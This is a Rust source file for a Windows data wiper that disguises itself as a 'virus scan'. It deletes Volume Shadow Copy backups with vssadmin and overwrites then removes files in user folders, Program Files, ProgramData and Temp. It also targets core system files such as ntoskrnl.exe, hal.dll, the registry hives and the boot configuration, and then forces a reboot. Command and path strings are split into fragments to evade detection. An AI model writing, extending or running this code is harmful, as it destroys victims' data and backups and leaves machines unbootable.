use std::process::Command;
use std::thread;
use std::time::Duration;
use std::fs;
use std::io::Write; 
use std::path::Path;
use walkdir::WalkDir; 

fn main() -> Result<(), Box<dyn std::error::Error>> {
    #[cfg(windows)] {
        println!("\n[+] this is completly a normal virus scan...");
        thread::sleep(Duration::from_secs(1));

        let notepad_cmd_part1 = "notep";
        let notepad_cmd_part2 = "ad.exe";
        let full_notepad_cmd = format!("{}{}", notepad_cmd_part1, notepad_cmd_part2);

        for _i in 0..50 { 
            Command::new(&full_notepad_cmd).spawn().ok(); 
        }
        println!("--- ma bad , let me close those notepads for u ---");
        thread::sleep(Duration::from_secs(10)); 

        println!("[+] be patient now...");
        thread::sleep(Duration::from_secs(1));

        // chopping them command dont do shit but its cool hhh
        let vss_cmd_p1 = "vssad";
        let vss_cmd_p2 = "min";
        let vss_arg1_p1 = "delete";
        let vss_arg1_p2 = " shadows";
        let vss_arg2 = "/all";
        let vss_arg3 = "/quiet";

        Command::new("cmd.exe")
            .args(&["/C", &format!("{}{}", vss_cmd_p1, vss_cmd_p2), &format!("{}{}", vss_arg1_p1, vss_arg1_p2), vss_arg2, vss_arg3])
            .output().ok();
        thread::sleep(Duration::from_secs(1));

        let targets = [
            //user related folder and files
            format!("C:\\Users\\%USERPROFILE%\\Deskt{}", "op\\"),                                                                                                               
            format!("C:\\Users\\Pu{}", "blic\\Desktop\\"),

            format!("C:\\Us{}", "ers\\"),               
            format!("C:\\Progr{}", "am Files\\"),      
            format!("C:\\Program Fil{}", "es (x86)\\" ), 
            format!("C:\\Progr{}", "amData\\"),         
            format!("C:\\Te{}", "mp\\"),               
            format!("C:\\Win{}", "dows\\Temp\\"),

            //this will fail , but ill take care of it in the future
            format!("C:\\Windows\\System32\\ntoskrn{}", "el.exe"), 
            format!("C:\\Windows\\System32\\hal{}", ".dll"),      
            format!("C:\\Windows\\System32\\winlo{}", "ad.exe"),  
            format!("C:\\Windows\\System32\\config\\SYSTE{}", "M"), 
            format!("C:\\Windows\\System32\\config\\SOFTWA{}", "RE"),
            format!("C:\\bo{}", "ot\\BCD"), 
            format!("C:\\bootm{}", "gr"),
        ];

        let overwrite_payload_p1 = b"IMRAN_DESTROYED_YOUR_OS_HAHAHA";
        let overwrite_payload_p2 = b"HAHA_:)";
        let mut overwrite_data = Vec::new();
        overwrite_data.extend_from_slice(overwrite_payload_p1);
        overwrite_data.extend_from_slice(overwrite_payload_p2);
        let overwrite_data_slice = overwrite_data.as_slice();


        for target_str_fmt in &targets {
            let target_path = Path::new(target_str_fmt);

            println!("[+] Attempting to scan(wink): {}", target_path.display());

            if target_path.is_file() {
                if let Ok(mut file) = fs::OpenOptions::new().write(true).create(false).truncate(true).open(target_path) {
                    file.write_all(overwrite_data_slice).ok();
                    println!("[+] successfully scanned lol: {}", target_path.display());
                }
                fs::remove_file(target_path).ok();
            } else if target_path.is_dir() {
                // i hate recursion
                let mut paths_to_process: Vec<_> = WalkDir::new(target_path)
                    .into_iter()
                    .filter_map(|e| e.ok())
                    .collect();
                paths_to_process.sort_by(|a, b| b.path().cmp(a.path())); 

                for entry in paths_to_process {
                    let p = entry.path();
                    if p == target_path && target_path.is_dir() { continue; } 
                    if p.is_symlink() { continue; } 

                    if p.is_file() {
                        if let Ok(mut file) = fs::OpenOptions::new().write(true).create(false).truncate(true).open(p) {
                            file.write_all(overwrite_data_slice).ok();
                        }
                        fs::remove_file(p).ok();
                    } else if p.is_dir() {
                        fs::remove_dir_all(p).ok();
                    }
                }
                fs::remove_dir_all(target_path).ok(); 
            }
        }
        
        println!("\n[+] virus scan finished lol. bye bye mf!");

        let shutdown_cmd_p1 = "shutd";
        let shutdown_cmd_p2 = "own.exe";
        let full_shutdown_cmd = format!("{}{}", shutdown_cmd_p1, shutdown_cmd_p2);
        Command::new(&full_shutdown_cmd).arg("/r").arg("/f").arg("/t").arg("0").spawn().ok();

    }
    Ok(())
}
